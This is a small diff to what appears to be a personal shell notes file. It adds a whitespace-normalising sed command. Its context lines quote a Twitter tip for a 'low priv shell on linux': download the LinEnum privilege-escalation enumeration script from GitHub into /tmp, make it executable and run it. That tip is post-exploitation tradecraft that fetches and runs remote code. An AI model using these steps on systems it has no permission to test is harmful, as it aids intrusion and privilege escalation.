@@ -53,6 +53,13 @@ pathadd ~/Library/Android/sdk/platform-tools/
 
 
 *****************************
+#change all white space to single space
+
+ls -l | sed 's/[[:space:]]\{1,\}/ /g' | cut -d' ' -f1-5,9-
+
+
+
+*****************************
 # from twitter @JaneScott_ ask first cmds to run
 # given a low priv shell on linux, responses
 Cd /tmp && wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh … then chmod +× LinEnum. sh lastly ./LinEnum.sh
